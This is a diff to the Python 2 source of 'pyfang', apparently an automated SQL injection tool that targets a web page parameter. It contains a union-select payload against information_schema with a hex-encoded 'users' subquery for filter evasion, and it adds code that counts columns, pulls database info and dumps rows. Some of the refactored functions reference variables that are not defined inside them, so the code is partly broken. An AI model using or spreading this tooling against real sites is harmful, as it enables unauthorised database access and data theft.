@@ -11,6 +11,7 @@
 
 import os, sys, urllib2
 import builder, datastore, injector, scanner, obfuscator, parser, reporter
+import md5
 import pprint
 import json
 
@@ -40,41 +41,23 @@ def obfuscate_subquery(obfuscator, obfuscation, subquery):
     
     return obfuscator.by_encoding(subquery, obfuscation)
 
-if __name__ == '__main__':
-
-    if len(sys.argv) == 1:
-        print 'Currently pyfang supports:'
-        print 'python pyfang [ip]/[page]?param'
-        sys.exit(0)
-
-    page = sys.argv[1]
-
-    # whitespace-delimited file
-    mysql_params = open('./lists/mysql/basic_union.txt').read().split()
-
-    # Instantiate classes used
-    scan = scanner.Scanner()
-    build = builder.Builder(page, mysql_params)
-    store = datastore.Store()
-    fang = injector.Injector(page, "")
-    report = reporter.Reporter()
-    parse = parser.Parser(store)
-    obfuscate = obfuscator.Obfuscator()
-
-    """
+def test_obfuscation():
     # Example obfuscation
     hexencoded = '1 union select column_name,2 from information_schema.columns where table_name = (select'
     hexencoded += obfuscate_subquery(obfuscate, 'hex', '\'users\'') + ')'
     print hexencoded
-    """
 
+def test_basic_data(page):
+    
     # Get column data for union statement
+    fang = injector.Injector(page, "")
     print '\n### Basic Page Structure ###'
     num_columns = fang.get_num_columns() 
     report.columns_in_statement(num_columns)
     magic_num = int(fang.get_visible_param())
     print '\tMagic Param','\t', magic_num
 
+def test_pwn(num_columns, magic_num):
     # Get DB params
     print '\n### Basic DB Info ###'
     db_data = fang.injection(build.union(num_columns, magic_num)) 
@@ -91,15 +74,42 @@ if __name__ == '__main__':
     report.columns(parse.columns(columns))
     columns = parse.columns(columns)
 
-    """
     # Get rows
     for column in columns:
-        x = build.rows(num_columns, magic_num, , data)
+        x = build.rows(num_columns, magic_num, data)
         print x
     data = fang.injection(x)
-    #print data
-    #print parse.rows(data)
+    print data
+    print parse.rows(data)
     #report.XXX(parse.XXX(data))
-    """
+
+if __name__ == '__main__':
+
+    if len(sys.argv) == 1:
+        print 'Currently pyfang supports:'
+        print 'python pyfang [ip]/[page]?param'
+        sys.exit(0)
+
+    page = sys.argv[1]
+
+
+    # whitespace-delimited file
+    mysql_params = open('./lists/mysql/basic_union.txt').read().split()
+    #config = open('./configs/mysql/php/query_configs.txt').readlines()
+
+    # Instantiate classes used
+    scan = scanner.Scanner()
+    build = builder.Builder(page, mysql_params)
+    store = datastore.Store()
+    fang = injector.Injector(page, "")
+    report = reporter.Reporter()
+    parse = parser.Parser(store)
+    obfuscate = obfuscator.Obfuscator()
+
+    x = build.comparative_precomputation()
+    my_dict = fang.pre_comp_injection(x)
+
+    store.create_lookup(my_dict)
+    print store.lookup_table
 
 
